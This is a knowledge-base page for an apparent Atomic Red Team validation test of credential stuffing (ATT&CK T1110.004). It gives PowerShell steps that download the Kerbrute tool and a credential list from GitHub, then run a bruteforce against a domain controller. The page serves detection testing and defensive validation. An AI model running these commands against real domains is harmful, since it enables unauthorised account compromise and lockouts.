---
atomic_guid: "4852c630-87a9-409b-bb5e-5dc12c9ebcde"
title: "Brute Force:Credential Stuffing using Kerbrute Tool"
framework: "atomic"
generated: "true"
attack_technique_id: "T1110.004"
attack_technique_name: "Brute Force: Credential Stuffing"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.004/T1110.004.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "4852c630-87a9-409b-bb5e-5dc12c9ebcde"
  - "Brute Force:Credential Stuffing using Kerbrute Tool"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Brute Force:Credential Stuffing using Kerbrute Tool

Will read username and password combos from a file or stdin (format username:password) and perform a bruteforce attack

## Metadata

- Atomic GUID: 4852c630-87a9-409b-bb5e-5dc12c9ebcde
- Technique: T1110.004: Brute Force: Credential Stuffing
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1110.004/T1110.004.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1110-brute_force|T1110.004]]

## Input Arguments

### domain

- description: Domain where you will be testing
- type: string
- default: $ENV:userdomain

### domaincontroller

- description: Domain controller where test will be run
- type: string
- default: $ENV:userdnsdomain

## Dependencies

kerbrute.exe must exist in PathToAtomicsFolder\..\ExternalPayloads

### Prerequisite Check

```powershell
if (test-path "PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe"){exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe" -outfile "PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe"
```

bruteforce.txt must exist in PathToAtomicsFolder\..\ExternalPayloads

### Prerequisite Check

```powershell
if (test-path "PathToAtomicsFolder\..\ExternalPayloads\bruteforce.txt"){exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.004/src/bruteforce.txt?raw=true" -outfile "PathToAtomicsFolder\..\ExternalPayloads\bruteforce.txt"
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
cd "PathToAtomicsFolder\..\ExternalPayloads"
.\kerbrute.exe bruteforce --dc #{domaincontroller} -d #{domain} "PathToAtomicsFolder\..\ExternalPayloads\bruteforce.txt"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.004/T1110.004.yaml)
